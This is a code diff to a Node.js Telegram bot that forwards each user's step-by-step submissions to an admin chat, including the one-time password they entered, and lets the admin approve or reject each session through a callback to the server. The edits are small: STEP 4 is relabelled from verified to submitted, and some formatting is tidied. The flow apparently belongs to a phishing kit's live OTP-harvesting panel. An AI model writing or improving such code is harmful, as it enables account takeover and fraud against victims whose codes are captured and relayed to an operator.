@@ -5,7 +5,6 @@ const BOT_TOKEN = process.env.BOT_TOKEN;
 const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
 const SERVER_URL = process.env.RENDER_EXTERNAL_URL;
 
-// Initialize bot with polling for Render
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
 // --- HELPERS ---
@@ -34,8 +33,8 @@ const sendStep3 = (d) => {
 };
 
 const sendStep4 = (d) => {
-    // Only called when OTP is verified
-    return send(`✅ <b>STEP 4 – OTP VERIFIED</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>ID:</b> <code>${d.socketId}</code>\n🔢 <b>Entered OTP:</b> <code>${escapeHTML(d.otp)}</code>`);
+    // This is the fix: It now shows as a submission
+    return send(`🔢 <b>STEP 4 – OTP SUBMITTED</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>ID:</b> <code>${d.socketId}</code>\n🔢 <b>Entered OTP:</b> <code>${escapeHTML(d.otp)}</code>`);
 };
 
 const sendStep5 = (d) => {
@@ -53,23 +52,15 @@ const sendStep5 = (d) => {
 bot.on("callback_query", async (query) => {
     const [action, socketId] = query.data.split("_");
     const message = query.message;
-
     try {
-        await axios.post(`${SERVER_URL}/admin/action`, { 
-            socketId, 
-            action: action === "apr" ? "approve" : "reject" 
-        });
-
+        await axios.post(`${SERVER_URL}/admin/action`, { socketId, action: action === "apr" ? "approve" : "reject" });
         const statusText = action === "apr" ? "✅ APPROVED" : "❌ REJECTED";
-        
         bot.editMessageText(`${message.text}\n\n${statusText} BY ADMIN`, {
             chat_id: ADMIN_CHAT_ID,
             message_id: message.message_id,
             parse_mode: "HTML"
         });
-    } catch (err) {
-        console.error("Callback Error:", err.message);
-    }
+    } catch (err) { console.error("Callback Error:", err.message); }
 });
 
 module.exports = { sendStep1, sendStep2, sendStep3, sendStep4, sendStep5 };
